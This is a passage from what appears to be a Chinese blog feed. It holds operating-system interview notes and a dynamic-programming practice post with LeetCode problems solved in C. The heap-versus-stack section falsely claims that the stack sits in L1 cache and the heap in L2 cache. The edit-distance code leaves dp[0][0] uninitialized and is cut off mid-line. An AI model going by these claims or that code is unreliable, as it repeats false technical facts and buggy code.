title="死锁产生的四个必要条件"></a>死锁产生的四个必要条件</h3><p>互斥：至少有一个资源必须属于非共享模式，即一次只能被一个进程使用；若其他申请使用该资源，那么申请进程必须等到该资源被释放为止；<br>请求与保持条件：一个进程因请求资源而阻塞时，对已获得的资源保持不放。<br>非抢占：进程已获得的资源，在末使用完之前，不能强行剥夺。<br>循环等待条件：若干进程之间形成一种头尾相接的循环等待资源关系。</p><h3 id="死锁解决的基本方法"><a href="#死锁解决的基本方法" class="headerlink" title="死锁解决的基本方法"></a>死锁解决的基本方法</h3><p>预防死锁、避免死锁、检测死锁、解除死锁 、鸵鸟策略 等</p><h2 id="0x02常见问题"><a href="#0x02常见问题" class="headerlink" title="0x02常见问题"></a>0x02常见问题</h2><h3 id="大端序和小端序的区别"><a href="#大端序和小端序的区别" class="headerlink" title="大端序和小端序的区别"></a>大端序和小端序的区别</h3><p><strong>小端字节序</strong>：低字节存于内存低地址；高字节存于内存高地址;</p><p><strong>大端字节序</strong>：高字节存于内存低地址；低字节存于内存高地址;</p><p>x86工作在小端序</p><h3 id="编译的流程"><a href="#编译的流程" class="headerlink" title="编译的流程"></a>编译的流程</h3><p>预处理</p><p>编译</p><p>汇编</p><p>链接</p><h3 id="堆和栈的区别"><a href="#堆和栈的区别" class="headerlink" title="堆和栈的区别"></a>堆和栈的区别</h3><h4 id="1-空间分配"><a href="#1-空间分配" class="headerlink" title="1.空间分配"></a>1.空间分配</h4><p>栈（操作系统）：由操作系统自动分配释放 ，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。<br>堆（操作系统）： 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回收，分配方式倒是类似于链表</p><h4 id="2-缓存方式"><a href="#2-缓存方式" class="headerlink" title="2.缓存方式"></a>2.缓存方式</h4><p>栈使用的是一级缓存， 他们通常都是被调用时处于存储空间中，调用完毕立即释放。<br>堆则是存放在二级缓存中，生命周期由虚拟机的垃圾回收算法来决定（并不是一旦成为孤儿对象就能被回收）。所以调用这些对象的速度要相对来得低一些。</p><h4 id="3-数据结构区别"><a href="#3-数据结构区别" class="headerlink" title="3.数据结构区别"></a>3.数据结构区别</h4><p>堆（数据结构）：堆可以被看成是一棵树，如：堆排序。<br>栈（数据结构）：一种先进后出的数据结构。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>算法练习-DP动态规划</title>
    <link href="/blog/2020/03/19/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0-DP%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    <url>/blog/2020/03/19/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0-DP%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/</url>
    
    <content type="html"><![CDATA[<p><strong>今天学习一下动态规划算法的应用与写法，准备机试进行时。</strong></p><p><img src="/images/fj38.jpg"></p><span id="more"></span><p><strong>动态规划</strong>（英语：Dynamic programming，简称 DP）是一种在数学、管理科学、计算机科学、经济学和生物信息学中使用的，通过把原问题分解为相对简单的子问题的方式求解复杂问题的方法。<br>动态规划常常适用于有重叠子问题和最优子结构性质的问题，动态规划方法所耗时间往往远少于朴素解法。<br>动态规划背后的基本思想非常简单。大致上，若要解一个给定问题，我们需要解其不同部分（即子问题），再根据子问题的解以得出原问题的解。动态规划往往用于优化递归问题，例如斐波那契数列，如果运用递归的方式来求解会重复计算很多相同的子问题，利用动态规划的思想可以减少计算量。<br>通常许多子问题非常相似，为此动态规划法试图仅仅解决每个子问题一次，具有天然剪枝的功能，从而减少计算量：一旦某个给定子问题的解已经算出，则将其记忆化存储，以便下次需要同一个子问题解之时直接查表。这种做法在重复子问题的数目关于输入的规模呈指数增长时特别有用</p><h2 id="1-解码方法"><a href="#1-解码方法" class="headerlink" title="1.解码方法"></a>1.解码方法</h2><h3 id="1-1题目描述"><a href="#1-1题目描述" class="headerlink" title="1.1题目描述"></a>1.1题目描述</h3><p>一条包含字母 A-Z 的消息通过以下方式进行了编码：<br>‘A’ -&gt; 1<br>‘B’ -&gt; 2<br>…<br>‘Z’ -&gt; 26<br>给定一个只包含数字的非空字符串，请计算解码方法的总数。<br>示例 1:<br>输入: “12”<br>输出: 2<br>解释: 它可以解码为 “AB”（1 2）或者 “L”（12）。<br>示例 2:<br>输入: “226”<br>输出: 3<br>解释: 它可以解码为 “BZ” (2 26), “VF” (22 6), 或者 “BBF” (2 2 6) 。</p><p>来源：<a href="https://leetcode-cn.com/problems/decode-ways/">https://leetcode-cn.com/problems/decode-ways/</a></p><h3 id="1-2思路"><a href="#1-2思路" class="headerlink" title="1.2思路"></a>1.2思路</h3><p>这个和青蛙跳台阶差不多思路，都是动态规划问题。如果字符串第一位就是0，出错，那么返回0即可。如果当前位置是0，向前查找上一个位置是不是1或者2，如果不是，编码出错，返回0，如果是，当前的结果数量就是上一次的数量。如果当前位置是1-6之间的数字，我们可以去判断上一个位置是不是1或2，如果是，当前结果数量，就是上一次的加上上次的，因为本次可以有跳一个和跳两个两种。然后更新pre的值。</p><h3 id="1-3代码"><a href="#1-3代码" class="headerlink" title="1.3代码"></a>1.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">numDecodings</span><span class="hljs-params">(<span class="hljs-type">char</span> * s)</span>&#123;<br>    <span class="hljs-keyword">if</span> (s[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;0&#x27;</span> || s[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>) <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> pre = <span class="hljs-number">1</span>, curr = <span class="hljs-number">1</span>;<span class="hljs-comment">//dp[-1] = dp[0] = 1</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; s[i] != <span class="hljs-number">0</span>; i++) &#123;<br>        <span class="hljs-type">int</span> tmp = curr;<br>        <span class="hljs-keyword">if</span> (s[i] == <span class="hljs-string">&#x27;0&#x27;</span>)<br>            <span class="hljs-keyword">if</span> (s[i - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;1&#x27;</span> || s[i - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;2&#x27;</span>) <br>                curr = pre; <span class="hljs-comment">//dp[i] = dp[i-2]</span><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// error</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (s[i - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;1&#x27;</span> || (s[i - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;2&#x27;</span> &amp;&amp; s[i] &gt;= <span class="hljs-string">&#x27;1&#x27;</span> &amp;&amp; s[i] &lt;= <span class="hljs-string">&#x27;6&#x27;</span>))<br>            curr = curr + pre;  <span class="hljs-comment">// dp[i] = dp[i-1] + dp[i-2]</span><br>        pre = tmp;  <span class="hljs-comment">// next dp[i-2] = dp[i-1] </span><br>    &#125;<br>    <span class="hljs-keyword">return</span> curr;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="2-最长回文子串"><a href="#2-最长回文子串" class="headerlink" title="2.最长回文子串"></a>2.最长回文子串</h2><h3 id="2-1题目描述"><a href="#2-1题目描述" class="headerlink" title="2.1题目描述"></a>2.1题目描述</h3><p>给定一个字符串 s，找到 s 中最长的回文子串。你可以假设 s 的最大长度为 1000。<br>示例 1：<br>输入: “babad”<br>输出: “bab”<br>注意: “aba” 也是一个有效答案。<br>示例 2：<br>输入: “cbbd”<br>输出: “bb”</p><p>来源：<a href="https://leetcode-cn.com/problems/longest-palindromic-substring/">https://leetcode-cn.com/problems/longest-palindromic-substring/</a></p><h3 id="2-2思路"><a href="#2-2思路" class="headerlink" title="2.2思路"></a>2.2思路</h3><p>第一想法就是直接暴力搜索，分偶数长度和奇数长度回文字符串，直接尝试保存目前最长的回文子串即可。</p><h3 id="2-3代码"><a href="#2-3代码" class="headerlink" title="2.3代码"></a>2.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">helper</span><span class="hljs-params">(<span class="hljs-type">char</span> *s, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right, <span class="hljs-type">int</span> *start, <span class="hljs-type">int</span> *len)</span> &#123;<br>    <span class="hljs-keyword">while</span> (left &gt;= <span class="hljs-number">0</span> &amp;&amp; right &lt; N &amp;&amp; s[left] == s[right])<br>        left--, right++;<br>    <span class="hljs-keyword">if</span> (right - left - <span class="hljs-number">1</span> &gt; *len) &#123;  <span class="hljs-comment">// 如果找到更长的子串，保存其信息</span><br>        *start = left + <span class="hljs-number">1</span>;<br>        *len = right - left - <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-type">char</span> * <span class="hljs-title function_">longestPalindrome</span><span class="hljs-params">(<span class="hljs-type">char</span> * s)</span>&#123;<br>    <span class="hljs-type">int</span> N = <span class="hljs-built_in">strlen</span>(s), start = <span class="hljs-number">0</span>, len = <span class="hljs-number">0</span>;  <span class="hljs-comment">// N 字符串长度， start 子串起始位置， len 子串长度</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++)     <span class="hljs-comment">// 奇数长度的回文子串</span><br>        helper(s, N, i<span class="hljs-number">-1</span>, i+<span class="hljs-number">1</span>, &amp;start, &amp;len);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; N; i++)     <span class="hljs-comment">// 偶数长度的回文子串</span><br>        helper(s, N, i, i+<span class="hljs-number">1</span>, &amp;start, &amp;len);<br>    s[start + len] = <span class="hljs-string">&#x27;\0&#x27;</span>;          <span class="hljs-comment">// 原地修改返回</span><br>    <span class="hljs-keyword">return</span> s + start;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-最大子序和"><a href="#3-最大子序和" class="headerlink" title="3.最大子序和"></a>3.最大子序和</h2><h3 id="3-1题目描述"><a href="#3-1题目描述" class="headerlink" title="3.1题目描述"></a>3.1题目描述</h3><p>给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。<br>示例:<br>输入: [-2,1,-3,4,-1,2,1,-5,4],<br>输出: 6<br>解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。</p><p>来源：<a href="https://leetcode-cn.com/problems/maximum-subarray/">https://leetcode-cn.com/problems/maximum-subarray/</a></p><h3 id="3-2思路"><a href="#3-2思路" class="headerlink" title="3.2思路"></a>3.2思路</h3><p>动态规划的是首先对数组进行遍历，当前最大连续子序列和为 sum，结果为 result<br>如果 sum &gt; 0，则说明 sum 对结果有增益效果，则 sum 保留并加上当前遍历数字<br>如果 sum &lt;&#x3D; 0，则说明 sum 对结果无增益效果，需要舍弃，则 sum 直接更新为当前遍历数字<br>每次比较 sum 和 result的大小，将最大值置为result，遍历结束返回结果<br>时间复杂度：O(n)</p><h3 id="3-3代码"><a href="#3-3代码" class="headerlink" title="3.3代码"></a>3.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">maxSubArray</span><span class="hljs-params">(<span class="hljs-type">int</span>* num, <span class="hljs-type">int</span> numsSize)</span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>,result = num[<span class="hljs-number">0</span>],sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(i&lt;numsSize)&#123;<br>        <span class="hljs-keyword">if</span>(sum &gt;= <span class="hljs-number">0</span>)&#123;<br>            sum+=num[i];<br>            i++;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            sum = num[i];<br>            i++;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(sum&gt;result)&#123;<br>            result = sum;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-不同路径"><a href="#4-不同路径" class="headerlink" title="4.不同路径"></a>4.不同路径</h2><h3 id="4-1题目描述"><a href="#4-1题目描述" class="headerlink" title="4.1题目描述"></a>4.1题目描述</h3><p>一个机器人位于一个 m x n 网格的左上角 。<br>机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角。<br>问总共有多少条不同的路径？</p><p>示例 1:<br>输入: m &#x3D; 3, n &#x3D; 2<br>输出: 3<br>解释:<br>从左上角开始，总共有 3 条路径可以到达右下角。</p><p>向右 -&gt; 向右 -&gt; 向下</p><p>向右 -&gt; 向下 -&gt; 向右</p><p>向下 -&gt; 向右 -&gt; 向右</p><p>示例 2:<br>输入: m &#x3D; 7, n &#x3D; 3<br>输出: 28</p><h3 id="4-2思路"><a href="#4-2思路" class="headerlink" title="4.2思路"></a>4.2思路</h3><p>第一个想到的直接计算阶乘即可，由于只能向右或者向下，那么根据数学知识可以很容易算出来结果，就是da。由于本章练习的是动态规划算法，所以还是用动态规划来写吧。</p><p>首先找到递推式，就是dp[i][j] &#x3D; dp[i-1][j] + dp[i][j-1];</p><p>然后如果在最上面一行或者最左面，那么结果就是1。</p><h3 id="4-3代码"><a href="#4-3代码" class="headerlink" title="4.3代码"></a>4.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">uniquePaths</span><span class="hljs-params">(<span class="hljs-type">int</span> m, <span class="hljs-type">int</span> n)</span>&#123;<br>    <span class="hljs-comment">//动态创建一个二维路径答案表</span><br>    <span class="hljs-comment">/*int **dp = (int **)malloc(sizeof(int *) * n);</span><br><span class="hljs-comment">    for (int i = 0; i &lt; n; i++) &#123;</span><br><span class="hljs-comment">        dp[i] = (int *)malloc(sizeof(int) * m);</span><br><span class="hljs-comment">    &#125;*/</span><br>    <span class="hljs-type">int</span> dp[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>];<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j++) &#123;<br>            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> || j == <span class="hljs-number">0</span>) &#123;     <span class="hljs-comment">//最上一行或者最左一列</span><br>                dp[i][j] = <span class="hljs-number">1</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                dp[i][j] = dp[i<span class="hljs-number">-1</span>][j] + dp[i][j<span class="hljs-number">-1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>];<span class="hljs-comment">//返回最后一个结果</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-不同路径升级版"><a href="#5-不同路径升级版" class="headerlink" title="5.不同路径升级版"></a>5.不同路径升级版</h2><h3 id="5-1题目描述"><a href="#5-1题目描述" class="headerlink" title="5.1题目描述"></a>5.1题目描述</h3><p>一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为“Start” ）。<br>机器人每次只能向下或者向右移动一步。机器人试图达到网格的右下角（在下图中标记为“Finish”）。<br>现在考虑网格中有障碍物。那么从左上角到右下角将会有多少条不同的路径？</p><p>网格中的障碍物和空位置分别用 1 和 0 来表示。</p><p>输入:<br>[<br>  [0,0,0],<br>  [0,1,0],<br>  [0,0,0]<br>]<br>输出: 2<br>解释:<br>3x3 网格的正中间有一个障碍物。<br>从左上角到右下角一共有 2 条不同的路径：</p><ol><li>向右 -&gt; 向右 -&gt; 向下 -&gt; 向下</li><li>向下 -&gt; 向下 -&gt; 向右 -&gt; 向右</li></ol><h3 id="5-2思路"><a href="#5-2思路" class="headerlink" title="5.2思路"></a>5.2思路</h3><p>和前面的差不多，只不过加了障碍，把有障碍的地方去掉，dp[i][j]&#x3D;0，然后先把第一行和第一列初始化完毕，不能和上面的一样一起初始化了。</p><h3 id="5-3代码"><a href="#5-3代码" class="headerlink" title="5.3代码"></a>5.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">uniquePathsWithObstacles</span><span class="hljs-params">(<span class="hljs-type">int</span>** obstacleGrid, <span class="hljs-type">int</span> obstacleGridSize, <span class="hljs-type">int</span>* obstacleGridColSize)</span>&#123;<br>    <span class="hljs-type">int</span> n = obstacleGridSize,m = *obstacleGridColSize;<span class="hljs-comment">//n行，m列</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">int</span> dp[<span class="hljs-number">100</span>][<span class="hljs-number">100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    <span class="hljs-keyword">if</span>(obstacleGrid[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] == <span class="hljs-number">1</span> || obstacleGrid[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>] == <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;     <span class="hljs-comment">//设置第一行的边界</span><br>        <span class="hljs-keyword">if</span>(obstacleGrid[i][<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>)&#123;<br>            dp[i][<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++)&#123;     <span class="hljs-comment">//设置第一列的边界</span><br>        <span class="hljs-keyword">if</span>(obstacleGrid[<span class="hljs-number">0</span>][i] == <span class="hljs-number">0</span>)&#123;<br>            dp[<span class="hljs-number">0</span>][i] = <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j++) &#123;<br>            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> || j == <span class="hljs-number">0</span>);   <span class="hljs-comment">//最上一行或者最左一列</span><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(obstacleGrid[i][j] == <span class="hljs-number">1</span>)&#123;<br>                dp[i][j] = <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                dp[i][j] = dp[i<span class="hljs-number">-1</span>][j] + dp[i][j<span class="hljs-number">-1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[n<span class="hljs-number">-1</span>][m<span class="hljs-number">-1</span>];<span class="hljs-comment">//返回最后一个结果</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-最小路径和"><a href="#6-最小路径和" class="headerlink" title="6.最小路径和"></a>6.最小路径和</h2><h3 id="6-1题目描述"><a href="#6-1题目描述" class="headerlink" title="6.1题目描述"></a>6.1题目描述</h3><p>给定一个包含非负整数的 m x n 网格，请找出一条从左上角到右下角的路径，使得路径上的数字总和为最小。<br>说明：每次只能向下或者向右移动一步。<br>示例:<br>输入:<br>[<br>  [1,3,1],<br>  [1,5,1],<br>  [4,2,1]<br>]<br>输出: 7<br>解释: 因为路径 1→3→1→1→1 的总和最小。</p><p>来源：<a href="https://leetcode-cn.com/problems/minimum-path-sum/">https://leetcode-cn.com/problems/minimum-path-sum/</a></p><h3 id="6-2思路"><a href="#6-2思路" class="headerlink" title="6.2思路"></a>6.2思路</h3><p>使用动态规划算法，dp数组记录该点到起始点的最短距离，边界时候单独处理，非边界取上一次计算的最小值加上本点的值即可。思路清晰代码也很简单。dp数组可以使用malloc动态分配即可，偷懒直接申请了一个挺大的空间。时间复杂度为遍历二维数组花费时间。</p><h3 id="6-3代码"><a href="#6-3代码" class="headerlink" title="6.3代码"></a>6.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> min(a,b)(a&lt;b?a:b)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">minPathSum</span><span class="hljs-params">(<span class="hljs-type">int</span>** grid, <span class="hljs-type">int</span> gridSize, <span class="hljs-type">int</span>* gridColSize)</span>&#123;<br>    <span class="hljs-type">int</span> m = gridSize,n = *gridColSize;<br>    <span class="hljs-type">int</span> dp[<span class="hljs-number">1000</span>][<span class="hljs-number">1000</span>];<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; m;i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;j &lt; n;j++)&#123;<br>            <span class="hljs-keyword">if</span>(i==<span class="hljs-number">0</span> &amp;&amp; j==<span class="hljs-number">0</span> )&#123;<br>                dp[i][j] = grid[i][j];<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(i == <span class="hljs-number">0</span>)&#123;<br>                dp[i][j] = grid[i][j] + dp[i][j<span class="hljs-number">-1</span>];<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(j == <span class="hljs-number">0</span>)&#123;<br>                dp[i][j] = grid[i][j] + dp[i<span class="hljs-number">-1</span>][j];<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                dp[i][j] = min(dp[i<span class="hljs-number">-1</span>][j],dp[i][j<span class="hljs-number">-1</span>]) + grid[i][j];<br>            &#125;<br>            <br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[m<span class="hljs-number">-1</span>][n<span class="hljs-number">-1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-编辑距离"><a href="#7-编辑距离" class="headerlink" title="7.编辑距离"></a>7.编辑距离</h2><h3 id="7-1题目描述"><a href="#7-1题目描述" class="headerlink" title="7.1题目描述"></a>7.1题目描述</h3><p>给定两个单词 word1 和 word2，计算出将 word1 转换成 word2 所使用的最少操作数 。<br>你可以对一个单词进行如下三种操作：<br>插入一个字符<br>删除一个字符<br>替换一个字符<br>示例 1:<br>输入: word1 &#x3D; “horse”, word2 &#x3D; “ros”<br>输出: 3<br>解释:<br>horse -&gt; rorse (将 ‘h’ 替换为 ‘r’)<br>rorse -&gt; rose (删除 ‘r’)<br>rose -&gt; ros (删除 ‘e’)<br>示例 2:<br>输入: word1 &#x3D; “intention”, word2 &#x3D; “execution”<br>输出: 5<br>解释:<br>intention -&gt; inention (删除 ‘t’)<br>inention -&gt; enention (将 ‘i’ 替换为 ‘e’)<br>enention -&gt; exention (将 ‘n’ 替换为 ‘x’)<br>exention -&gt; exection (将 ‘n’ 替换为 ‘c’)<br>exection -&gt; execution (插入 ‘u’)</p><p>来源：<a href="https://leetcode-cn.com/problems/edit-distance/">https://leetcode-cn.com/problems/edit-distance/</a></p><h3 id="7-2思路"><a href="#7-2思路" class="headerlink" title="7.2思路"></a>7.2思路</h3><p><strong>动态规划：</strong></p><p>dp[i][j] 代表 word1 到 i 位置转换成 word2 到 j 位置需要最少步数<br>所以，<br>当 word1[i] &#x3D;&#x3D; word2[j]，dp[i][j] &#x3D; dp[i-1][j-1]；<br>当 word1[i] !&#x3D; word2[j]，dp[i][j] &#x3D; min(dp[i-1][j-1], dp[i-1][j], dp[i][j-1]) + 1<br>其中，dp[i-1][j-1]到dp[i][j]需要进行替换操作，dp[i-1][j]到d[i][j]需要进行删除操作，dp[i][j-1] 到d[i][j]需要进行添加操作。</p><p><img src="/%5Cimages%5Cdp7.png"></p><h3 id="7-3代码"><a href="#7-3代码" class="headerlink" title="7.3代码"></a>7.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> min(a,b) (a&lt;b?a:b)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">minDistance</span><span class="hljs-params">(<span class="hljs-type">char</span> * word1, <span class="hljs-type">char</span> * word2)</span>&#123;<br>    <span class="hljs-type">int</span> n1 = <span class="hljs-built_in">strlen</span>(word1);<br>    <span class="hljs-type">int</span> n2 = <span class="hljs-built_in">strlen</span>(word2);<br>    <span class="hljs-type">int</span> dp[<span class="hljs-number">600</span>][<span class="hljs-number">600</span>];<br>    <span class="hljs-comment">// 第一行初始化</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n2; j++) dp[<span class="hljs-number">0</span>][j] = dp[<span class="hljs-number">0</span>][j - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">// 第一列初始化</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n1; i++) dp[i][<span class="hljs-number">0</span>] = dp[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n1; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n2; j++) &#123;<br>            <span class="hljs-keyword">if</span> (word1[i <span class="hljs-number">-1</span>] == word2[j - <span class="hljs-number">1</span>]) <br>                dp[i][j] = dp[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">else</span> <br>                dp[i][j] = min(min(dp[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>], dp[i][j - <span class="hljs-number">1</span>]), dp[i - <span 